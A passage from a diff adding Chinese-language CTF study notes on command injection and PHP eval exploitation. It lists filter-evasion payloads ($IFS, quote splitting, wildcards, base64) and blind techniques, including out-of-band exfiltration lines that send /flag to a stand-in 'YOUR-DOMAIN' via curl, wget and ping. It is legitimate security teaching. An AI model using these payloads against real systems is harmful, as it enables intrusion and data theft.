+<td><strong>或</strong>:左边失败才执行右边</td>
+<td>左边可能报错时</td>
+</tr>
+<tr>
+<td><strong><code>&amp;</code></strong></td>
+<td><strong>后台执行</strong></td>
+<td>少见</td>
+</tr>
+<tr>
+<td><strong><code>&amp;&amp;</code></strong></td>
+<td><strong>与</strong>:左边成功才执行右边</td>
+<td>左边一定有输出时</td>
+</tr>
+<tr>
+<td><strong><code>%0a</code></strong>(换行)</td>
+<td>等同于 <code>;</code></td>
+<td><code>;</code> 被拦时</td>
+</tr>
+<tr>
+<td><strong><code>`cmd`</code></strong></td>
+<td><strong>命令替换</strong>:把输出塞进字符串</td>
+<td>路径被拦时(见第五节)</td>
+</tr>
+<tr>
+<td><strong><code>$(cmd)</code></strong></td>
+<td>同上,更现代的写法</td>
+<td>同上</td>
+</tr>
+</tbody>
+</table>
+<p><strong>⚠️ 区别：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>;id        →  追加一条命令,id 的输出单独出现
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>`id`       →  把 id 的输出替换到当前位置,原命令会拿它当参数
+</span></code></pre></div>
+<p><strong>这就是为什么 <code>cat</code> + <code>`ls`</code> = <code>cat &lt;ls的输出&gt;</code>。</strong></p>
+<hr />
+<h2 id="_6">三、空格被拦怎么办<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h2>
+<p><strong>空格是命令注入第一道常见防线。绕法很多：</strong></p>
+<table>
+<thead>
+<tr>
+<th>手法</th>
+<th>写法</th>
+<th>说明</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong><code>$IFS</code></strong></td>
+<td><code>cat$IFS/flag</code></td>
+<td><strong>最常用</strong>,IFS = Internal Field Separator</td>
+</tr>
+<tr>
+<td><strong><code>${IFS}</code></strong></td>
+<td><code>cat${IFS}/flag</code></td>
+<td>带花括号,更明确</td>
+</tr>
+<tr>
+<td><strong><code>$IFS$9</code></strong></td>
+<td><code>cat$IFS$9/flag</code></td>
+<td>加个空位置参数,打断模式</td>
+</tr>
+<tr>
+<td><strong><code>&lt;</code></strong></td>
+<td><code>cat&lt;/flag</code></td>
+<td>输入重定向,天然分隔</td>
+</tr>
+<tr>
+<td><strong><code>&lt;&gt;</code></strong></td>
+<td><code>cat&lt;&gt;/flag</code></td>
+<td>同上</td>
+</tr>
+<tr>
+<td><strong><code>%09</code></strong></td>
+<td><code>cat%09/flag</code></td>
+<td>Tab(URL 编码后被解码)</td>
+</tr>
+<tr>
+<td><strong><code>%0a</code></strong></td>
+<td><code>cat%0a/flag</code></td>
+<td>换行</td>
+</tr>
+<tr>
+<td><strong><code>%0b</code></strong> <code>%0c</code> <code>%0d</code></td>
+<td>同上</td>
+<td>垂直制表/换页/回车</td>
+</tr>
+<tr>
+<td><strong><code>{cat,/flag}</code></strong></td>
+<td>花括号展开</td>
+<td><strong>只在 bash 下有效</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>$IFS</code> 是什么：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>IFS = Internal Field Separator,默认值是「空格 + Tab + 换行」
+</span><span id="__span-3-2"><a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>echo $IFS  →  三个空白字符
+</span><span id="__span-3-3"><a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>所以 cat$IFS/flag 等价于 cat /flag
+</span></code></pre></div>
+<p><strong>⚠️ 必须是</strong>半角** <code>$</code>,中文输入法下容易打成全角 <code>￥</code> —— 那样不会展开。**</p>
+<hr />
+<h2 id="_7">四、关键词被拦怎么办<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h2>
+<p><strong>比如 <code>flag</code>、<code>cat</code>、<code>ls</code>、<code>system</code> 被拉黑。</strong></p>
+<h3 id="1">① 引号拆分<a class="headerlink" href="#1" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>fl<span class="s1">''</span>ag<span class="w">          </span><span class="c1"># 空字符串拼接</span>
+</span><span id="__span-4-2"><a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a>fl<span class="s2">""</span>ag
+</span><span id="__span-4-3"><a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>c<span class="s1">''</span>at
+</span><span id="__span-4-4"><a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a>ca<span class="s1">''</span>t
+</span></code></pre></div>
+<p><strong>shell 会把相邻的字符串拼起来：<code>fl</code> + <code>''</code> + <code>ag</code> = <code>flag</code>。</strong></p>
+<h3 id="2">② 反斜杠转义<a class="headerlink" href="#2" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>fl<span class="se">\a</span>g
+</span><span id="__span-5-2"><a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>c<span class="se">\a</span>t<span class="w"> </span>/flag
+</span></code></pre></div>
+<h3 id="3">③ 通配符<a class="headerlink" href="#3" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>cat<span class="w"> </span>/f*
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>cat<span class="w"> </span>/fla?
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>cat<span class="w"> </span>/f<span class="o">[</span>a-z<span class="o">]</span>ag
+</span><span id="__span-6-4"><a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>cat<span class="w"> </span>/f???.
+</span></code></pre></div>
+<p><strong><code>?</code> 匹配一个字符,<code>*</code> 匹配任意,<code>[a-z]</code> 字符类。</strong></p>
+<h3 id="4">④ 变量拼接<a class="headerlink" href="#4" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="nv">a</span><span class="o">=</span>fl<span class="p">;</span><span class="nv">b</span><span class="o">=</span>ag<span class="p">;</span>cat<span class="w"> </span>/<span class="nv">$a$b</span>
+</span></code></pre></div>
+<h3 id="5">⑤ 命令替代(路径被拦时最好用)<a class="headerlink" href="#5" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>cat<span class="w"> </span><span class="sb">`</span>ls<span class="sb">`</span>
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>cat<span class="w"> </span><span class="k">$(</span>ls<span class="k">)</span>
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>cat<span class="w"> </span><span class="k">$(</span>ls<span class="w"> </span>/<span class="k">)</span>
+</span></code></pre></div>
+<p><strong>让系统自己算出文件名 —— 你不需要写 <code>flag</code> 这个字面量。</strong></p>
+<h3 id="6">⑥ 大小写 / 编码<a class="headerlink" href="#6" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>/FLAG<span class="w">          </span><span class="c1"># 如果文件系统不区分大小写</span>
+</span><span id="__span-9-2"><a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a>cat<span class="w"> </span><span class="k">$(</span><span class="nb">echo</span><span class="w"> </span><span class="nv">ZmxhZw</span><span class="o">==</span><span class="w"> </span><span class="p">|</span><span class="w"> </span>base64<span class="w"> </span>-d<span class="k">)</span>
+</span></code></pre></div>
+<hr />
+<h2 id="_8">五、路径被拦怎么办<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h2>
+<p><strong>除了通配符，最有效的是</strong>命令替换<strong>：</strong></p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a><span class="p">|</span>cat<span class="nv">$IFS</span><span class="sb">`</span>ls<span class="sb">`</span><span class="w">          </span>←<span class="w"> </span>先<span class="w"> </span>ls,把结果当<span class="w"> </span>cat<span class="w"> </span>的参数
+</span><span id="__span-10-2"><a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a><span class="p">|</span>cat<span class="nv">$IFS</span><span class="k">$(</span>ls<span class="k">)</span>
+</span><span id="__span-10-3"><a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a><span class="p">|</span>cat&lt;/*<span class="w">               </span>←<span class="w"> </span>读当前目录第一个文件
+</span></code></pre></div>
+<p><strong><code>cat&lt;/*</code> 的原理：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>&lt; 是输入重定向
+</span><span id="__span-11-2"><a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>* 被 shell 展开成当前目录所有文件名
+</span><span id="__span-11-3"><a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>如果只有一个文件,就变成 cat &lt; 文件名
+</span></code></pre></div>
+<p><strong>这招在"只知道目录里有个文件但不知道名字"时很好用。</strong></p>
+<hr />
+<h2 id="_9">六、命令替代表<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h2>
+<p><strong><code>cat</code> 被拦时,能读文件的一大堆：</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>用法</th>
+<th>特点</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>cat</code></td>
+<td><code>cat /flag</code></td>
+<td>最常用</td>
+</tr>
+<tr>
+<td><strong><code>tac</code></strong></td>
+<td><code>tac /flag</code></td>
+<td>倒序输出(内容反了)</td>
+</tr>
+<tr>
+<td><strong><code>nl</code></strong></td>
+<td><code>nl /flag</code></td>
+<td>带行号</td>
+</tr>
+<tr>
+<td><code>more</code></td>
+<td><code>more /flag</code></td>
+<td>分页</td>
+</tr>
+<tr>
+<td><code>less</code></td>
+<td><code>less /flag</code></td>
+<td>分页</td>
+</tr>
+<tr>
+<td><code>head</code></td>
+<td><code>head /flag</code></td>
+<td>前 10 行</td>
+</tr>
+<tr>
+<td><code>tail</code></td>
+<td><code>tail /flag</code></td>
+<td>后 10 行</td>
+</tr>
+<tr>
+<td><strong><code>sort</code></strong></td>
+<td><code>sort /flag</code></td>
+<td>排序(单行时原样)</td>
+</tr>
+<tr>
+<td><code>uniq</code></td>
+<td><code>uniq /flag</code></td>
+<td>去重</td>
+</tr>
+<tr>
+<td><strong><code>od</code></strong></td>
+<td><code>od -c /flag</code></td>
+<td>八进制/字符转储</td>
+</tr>
+<tr>
+<td><code>strings</code></td>
+<td><code>strings /flag</code></td>
+<td>提取可打印字符</td>
+</tr>
+<tr>
+<td><code>base64</code></td>
+<td><code>base64 /flag</code></td>
+<td>编码(自己再解)</td>
+</tr>
+<tr>
+<td><code>rev</code></td>
+<td><code>rev /flag</code></td>
+<td>反转</td>
+</tr>
+<tr>
+<td><code>awk</code></td>
+<td><code>awk '{print}' /flag</code></td>
+<td>等价 cat</td>
+</tr>
+<tr>
+<td><code>sed</code></td>
+<td><code>sed -n p /flag</code></td>
+<td>等价 cat</td>
+</tr>
+<tr>
+<td><strong><code>grep</code></strong></td>
+<td><code>grep . /flag</code></td>
+<td><strong>只输出匹配的行</strong></td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>sort</code> 和 <code>grep</code> 的区别（读单行文件时效果一样）：</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th><code>sort</code></th>
+<th><code>grep</code></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>用途</td>
+<td>排序</td>
+<td>搜索</td>
+</tr>
+<tr>
+<td>输出</td>
+<td><strong>所有行</strong>（排序后）</td>
+<td><strong>只输出匹配的行</strong></td>
+</tr>
+<tr>
+<td>要模式吗</td>
+<td>不用</td>
+<td><strong>要</strong>（<code>grep . 文件</code> / <code>grep '' 文件</code>）</td>
+</tr>
+<tr>
+<td>多行文件</td>
+<td>全出但<strong>顺序变了</strong></td>
+<td>只出匹配的</td>
+</tr>
+</tbody>
+</table>
+<p><strong><code>flag</code> 只有一行时两个都行；多行文件时 <code>sort</code> 会重排、<code>grep</code> 会过滤。</strong></p>
+<p><strong>列目录的替代：</strong></p>
+<table>
+<thead>
+<tr>
+<th>命令</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>ls</code></td>
+<td><code>ls /</code></td>
+</tr>
+<tr>
+<td><code>dir</code></td>
+<td><code>dir</code></td>
+</tr>
+<tr>
+<td><code>find</code></td>
+<td><code>find / -name "flag*"</code></td>
+</tr>
+<tr>
+<td><code>echo</code></td>
+<td><code>echo /</code></td>
+</tr>
+</tbody>
+</table>
+<hr />
+<h2 id="_10">七、无回显:三种盲注<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h2>
+<h3 id="1_1">① 时间延迟(最快确认通道)<a class="headerlink" href="#1_1" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a><span class="p">;</span>sleep<span class="w"> </span><span class="m">5</span>
+</span><span id="__span-12-2"><a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a><span class="p">;</span>sleep<span class="nv">$IFS5</span>
+</span><span id="__span-12-3"><a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a><span class="p">;</span>ping<span class="w"> </span>-c<span class="w"> </span><span class="m">3</span><span class="w"> </span><span class="m">127</span>.0.0.1
+</span><span id="__span-12-4"><a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a><span class="p">;</span>timeout<span class="w"> </span><span class="m">5</span><span class="w"> </span>cat<span class="w"> </span>/flag
+</span></code></pre></div>
+<p><strong>响应慢 5 秒 → 命令执行了。</strong></p>
+<p><strong>不同系统的睡眠命令：</strong></p>
+<table>
+<thead>
+<tr>
+<th>系统</th>
+<th>命令</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Linux</td>
+<td><code>sleep 5</code></td>
+</tr>
+<tr>
+<td>Windows</td>
+<td><code>timeout /t 5</code> 或 <code>ping -n 6 127.0.0.1</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="2_1">② 输出重定向(写到能访问的地方)<a class="headerlink" href="#2_1" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="p">;</span>cat<span class="w"> </span>/flag<span class="w"> </span>&gt;<span class="w"> </span>/var/www/html/x.txt
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="p">;</span>cp<span class="w"> </span>/flag<span class="w"> </span>/var/www/html/x.txt
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="p">;</span>cat<span class="w"> </span>/flag<span class="w"> </span>&gt;<span class="w"> </span>./x.txt
+</span></code></pre></div>
+<p><strong>然后访问 <code>http://target/x.txt</code> 读取。</strong></p>
+<p><strong>⚠️ 要知道 web 根目录在哪,常见 <code>/var/www/html</code>。</strong></p>
+<h3 id="3-dns-http">③ 外带(DNS / HTTP)<a class="headerlink" href="#3-dns-http" title="Permanent link">&para;</a></h3>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a><span class="p">;</span>curl<span class="w"> </span>http://YOUR-DOMAIN/<span class="k">$(</span>cat<span class="w"> </span>/flag<span class="k">)</span>
+</span><span id="__span-14-2"><a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a><span class="p">;</span>wget<span class="w"> </span>http://YOUR-DOMAIN/<span class="k">$(</span>cat<span class="w"> </span>/flag<span class="k">)</span>
+</span><span id="__span-14-3"><a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a><span class="p">;</span>ping<span class="w"> </span><span class="sb">`</span>cat<span class="w"> </span>/flag<span class="sb">`</span>.YOUR-DOMAIN
+</span></code></pre></div>
+<p><strong>没有回显、不能写文件时,让服务器主动联系你。</strong></p>
+<p><strong>DNS 外带的原理和 SQL 的 OOB 一样 —— 见 <code>sql/06-OOB带外注入.md</code>。</strong></p>
+<hr />
+<h2 id="_11">八、代码执行：和命令注入的区别<a class="headerlink" href="#_11" title="Permanent link">&para;</a></h2>
+<p><strong>这是两套完全不同的东西，混了就会像"没执行"一样卡住。</strong></p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th>命令注入</th>
+<th>代码执行</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>执行的是什么</strong></td>
+<td><strong>系统命令</strong>（<code>ls</code>、<code>id</code>、<code>cat</code>）</td>
+<td><strong>PHP 代码</strong>（<code>echo</code>、<code>phpinfo()</code>）</td>
+</tr>
+<tr>
+<td><strong>典型 sink</strong></td>
+<td><code>system()</code> <code>exec()</code> <code>shell_exec()</code> <code>passthru()</code> 反引号</td>
+<td><code>eval()</code> <code>assert()</code> <code>create_function()</code> <code>preg_replace(/e)</code></td>
+</tr>
+<tr>
+<td><strong><code>;</code> 的含义</strong></td>
+<td><strong>命令分隔符</strong></td>
+<td><strong>语句结束符</strong></td>
+</tr>
+<tr>
+<td><strong>payload 例子</strong></td>
+<td><code>;id</code></td>
+<td><code>echo(123);</code></td>
+</tr>
+<tr>
+<td><strong>输出来自</strong></td>
+<td>命令的 stdout</td>
+<td><code>echo</code> / <code>print</code></td>
+</tr>
+</tbody>
+</table>
+<h3 id="81">8.1 一条命令判断在哪一边<a class="headerlink" href="#81" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-15-1"><a id="__codelineno-15-1" name="__codelineno-15-1" href="#__codelineno-15-1"></a>aaa=echo(123);
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>返回</th>
+<th>结论</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>页面出现 <code>123</code></td>
+<td><strong>代码执行</strong>（eval）</td>
+</tr>
+<tr>
+<td>没反应 / 语法错</td>
+<td><strong>命令注入</strong>（shell）</td>
+</tr>
+</tbody>
+</table>
+<p><strong>反过来验证命令注入：</strong></p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-16-1"><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a>aaa=;id
+</span></code></pre></div>
+<p><strong>出现 <code>uid=</code> → shell。</strong></p>
+<h3 id="82">8.2 最典型的坑<a class="headerlink" href="#82" title="Permanent link">&para;</a></h3>
+<blockquote>
+<p><strong>在 eval 题里写 <code>;ls /</code> —— <code>ls /</code> 不是合法 PHP，直接语法错，
+表现得和"命令没执行"一模一样。</strong></p>
+</blockquote>
+<p><strong>而且 eval 里每条语句</strong>必须<strong>有 <code>;</code>：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-17-1"><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a><span class="x">eval('echo(12)')    →  Parse error: unexpected end of file, expecting ';'</span>
+</span><span id="__span-17-2"><a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a><span class="x">eval('echo(12);')   →  输出 12</span>
+</span><span id="__span-17-3"><a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a><span class="x">eval('echo(1);echo(2);')  →  输出 12</span>
+</span></code></pre></div>
+<p><strong>为什么：普通 PHP 文件里 <code>?&gt;</code> 能代替分号，eval 没有 <code>?&gt;</code>。</strong></p>
+<h3 id="83">8.3 两边的 <code>;</code> 长得一样，意思不同<a class="headerlink" href="#83" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-18-1"><a id="__codelineno-18-1" name="__codelineno-18-1" href="#__codelineno-18-1"></a>RCE 题(shell):   id;whoami          →  两条系统命令
+</span><span id="__span-18-2"><a id="__codelineno-18-2" name="__codelineno-18-2" href="#__codelineno-18-2"></a>eval 题(PHP):    echo(1);echo(2);   →  两条 PHP 语句
+</span></code></pre></div>
+<p><strong>写 payload 前先问自己：我现在在 shell 层还是 PHP 层？</strong></p>
+<hr />
+<h2 id="php">九、PHP 代码执行：绕关键词的四种思路<a class="headerlink" href="#php" title="Permanent link">&para;</a></h2>
+<h3 id="91">9.1 先搞清黑名单是"拦"还是"换"<a class="headerlink" href="#91" title="Permanent link">&para;</a></h3>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-19-1"><a id="__codelineno-19-1" name="__codelineno-19-1" href="#__codelineno-19-1"></a><span class="x">// 拦截型：命中就 die</span>
+</span><span id="__span-19-2"><a id="__codelineno-19-2" name="__codelineno-19-2" href="#__codelineno-19-2"></a><span class="x">if (preg_match('/flag/i', $code)) die('NO');</span>
+</span><span id="__span-19-3"><a id="__codelineno-19-3" name="__codelineno-19-3" href="#__codelineno-19-3"></a>
+</span><span id="__span-19-4"><a id="__codelineno-19-4" name="__codelineno-19-4" href="#__codelineno-19-4"></a><span class="x">// 替换型：命中就替换成别的词</span>
+</span><span id="__span-19-5"><a id="__codelineno-19-5" name="__codelineno-19-5" href="#__codelineno-19-5"></a><span class="x">$code = str_ireplace(['flag','system'], 'hacker', $code);</span>
+</span><span id="__span-19-6"><a id="__codelineno-19-6" name="__codelineno-19-6" href="#__codelineno-19-6"></a><span class="x">eval($code);</span>
+</span></code></pre></div>
+<table>
+<thead>
+<tr>
+<th>类型</th>
+<th>现象</th>
+<th>绕法</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>拦截型</strong></td>
+<td>直接报错 / 空白</td>
+<td>换等价函数、拆分关键词</td>
+</tr>
+<tr>
+<td><strong>替换型</strong></td>
+<td><strong>不报错</strong>，但代码被悄悄改写</td>
+<td><strong>把词拆开</strong>，让它匹配不到</td>
+</tr>
+</tbody>
+</table>
+<p><strong>替换型的关键：过滤器只看</strong>原始字符串<strong>，真正的拼接发生在运行时。</strong></p>
+<h3 id="92">9.2 四种思路<a class="headerlink" href="#92" title="Permanent link">&para;</a></h3>
+<h4 id="1-implode-join">① 用 <code>implode</code> / <code>join</code> 拼字符串（<code>.</code> 被禁时）<a class="headerlink" href="#1-implode-join" title="Permanent link">&para;</a></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-20-1"><a id="__codelineno-20-1" name="__codelineno-20-1" href="#__codelineno-20-1"></a><span class="x">implode(['/','f','l','a','g'])    →  '/flag'</span>
+</span><span id="__span-20-2"><a id="__codelineno-20-2" name="__codelineno-20-2" href="#__codelineno-20-2"></a><span class="x">join(['s','y','s','t','e','m'])   →  'system'</span>
+</span></code></pre></div>
+<p><strong>过滤时看到的是 <code>'f','l','a','g'</code> —— 匹配不到 <code>flag</code> 这个词。</strong></p>
+<h4 id="2_2">② 用「位置」代替「名字」<a class="headerlink" href="#2_2" title="Permanent link">&para;</a></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-21-1"><a id="__codelineno-21-1" name="__codelineno-21-1" href="#__codelineno-21-1"></a><span class="x">array_slice(glob('/*'), 4, 1)     →  ['/flag']   （下标 4 = 第 5 个）</span>
+</span></code></pre></div>
+<p><strong>你不知道它叫什么，但知道它排第几。</strong></p>
+<h4 id="3-glob">③ 通配符：<code>glob()</code><a class="headerlink" href="#3-glob" title="Permanent link">&para;</a></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-22-1"><a id="__codelineno-22-1" name="__codelineno-22-1" href="#__codelineno-22-1"></a><span class="x">glob('/*')      →  根目录所有项（数组）</span>
+</span><span id="__span-22-2"><a id="__codelineno-22-2" name="__codelineno-22-2" href="#__codelineno-22-2"></a><span class="x">glob('/f*')     →  只匹配 f 开头的</span>
+</span></code></pre></div>
+<p><strong>⚠️ <code>glob</code> 是 PHP 函数；<code>show_source('/f*')</code> 不会展开通配符。</strong></p>
+<h4 id="4_1">④ 动态调用：拼出函数名再调<a class="headerlink" href="#4_1" title="Permanent link">&para;</a></h4>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-23-1"><a id="__codelineno-23-1" name="__codelineno-23-1" href="#__codelineno-23-1"></a><span class="x">implode(['s','y','s','t','e','m'])('id')</span>
+</span></code></pre></div>
+<p><strong><code>system</code> 被替换成 hacker 也不怕 —— 你拼出来的是运行时字符串。</strong></p>
+<h3 id="93">9.3 常用函数速查<a class="headerlink" href="#93" title="Permanent link">&para;</a></h3>
+<h4 id="_12">打印输出<a class="headerlink" href="#_12" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+<th>注意</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>echo</code></td>
+<td>输出字符串</td>
+<td><strong>数组会变成 <code>Array</code></strong></td>
+</tr>
+<tr>
+<td><code>print_r</code></td>
+<td>打印变量（含数组）</td>
+<td>含 <code>print</code>，可能被拦</td>
+</tr>
+<tr>
+<td><code>var_dump</code></td>
+<td>打印类型和值</td>
+<td>含 <code>var</code></td>
+</tr>
+<tr>
+<td><code>join</code> / <code>implode</code></td>
+<td>数组转字符串</td>
+<td><code>.</code> 被禁时的替代品</td>
+</tr>
+</tbody>
+</table>
+<h4 id="_13">读文件<a class="headerlink" href="#_13" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+<th>注意</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>show_source</code></td>
+<td>高亮输出文件</td>
+<td><code>highlight_file</code> 的别名</td>
+</tr>
+<tr>
+<td><code>highlight_file</code></td>
+<td>同上</td>
+<td></td>
+</tr>
+<tr>
+<td><code>file_get_contents</code></td>
+<td>读成字符串</td>
+<td>含 <code>file</code></td>
+</tr>
+<tr>
+<td><code>readfile</code></td>
+<td>读并输出</td>
+<td>含 <code>file</code></td>
+</tr>
+<tr>
+<td><code>fopen</code> + <code>fread</code></td>
+<td>句柄读</td>
+<td>需要变量</td>
+</tr>
+<tr>
+<td><code>require</code></td>
+<td>当 PHP 执行</td>
+<td>纯文本会当 HTML 输出</td>
+</tr>
+</tbody>
+</table>
+<h4 id="_14">列目录<a class="headerlink" href="#_14" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>返回</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>glob('/*')</code></td>
+<td>数组，支持通配符</td>
+</tr>
+<tr>
+<td><code>scandir('/')</code></td>
+<td>数组，不支持通配符（含 <code>scan</code> 可能被拦）</td>
+</tr>
+<tr>
+<td><code>opendir</code> + <code>readdir</code></td>
+<td>句柄 / 单个</td>
+</tr>
+</tbody>
+</table>
+<h4 id="_15">数组处理（绕关键词的核心）<a class="headerlink" href="#_15" title="Permanent link">&para;</a></h4>
+<table>
+<thead>
+<tr>
+<th>函数</th>
+<th>作用</th>
+<th>返回</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>array_slice(数组, 起点, 长度)</code></td>
+<td>切片</td>
+<td><strong>数组</strong></td>
+</tr>
+<tr>
+<td><code>array_shift</code></td>
+<td>取第一个</td>
+<td>元素</td>
+</tr>
+<tr>
+<td><code>array_pop</code></td>
+<td>取最后一个</td>
+<td>元素</td>
+</tr>
+<tr>
+<td><code>join(数组)</code></td>
+<td>拼成字符串</td>
+<td><strong>字符串</strong></td>
+</tr>
+</tbody>
+</table>
+<h3 id="94">9.4 两个高频错误<a class="headerlink" href="#94" title="Permanent link">&para;</a></h3>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-24-1"><a id="__codelineno-24-1" name="__codelineno-24-1" href="#__codelineno-24-1"></a>❌ echo(glob('/*'))
+</span><span id="__span-24-2"><a id="__codelineno-24-2" name="__codelineno-24-2" href="#__codelineno-24-2"></a>   → 只输出 "Array"（echo 不能输出数组）
+</span><span id="__span-24-3"><a id="__codelineno-24-3" name="__codelineno-24-3" href="#__codelineno-24-3"></a>
+</span><span id="__span-24-4"><a id="__codelineno-24-4" name="__codelineno-24-4" href="#__codelineno-24-4"></a>❌ array_slice(join(glob('/*')),4,1)
+</span><span id="__span-24-5"><a id="__codelineno-24-5" name="__codelineno-24-5" href="#__codelineno-24-5"></a>   → array_slice 要数组,join 给的是字符串（顺序反了）
+</span></code></pre></div>
+<p><strong>正确写法：</strong></p>
+<div class="language-php highlight"><pre><span></span><code><span id="__span-25-1"><a id="__codelineno-25-1" name="__codelineno-25-1" href="#__codelineno-25-1"></a><span class="x">echo(join(',',glob('/*')));                       // 看内容</span>
+</span><span id="__span-25-2"><a id="__codelineno-25-2" name="__codelineno-25-2" href="#__codelineno-25-2"></a><span class="x">show_source(join(array_slice(glob('/*'),4,1)));   // 读第 5 个</span>
+</span></code></pre></div>
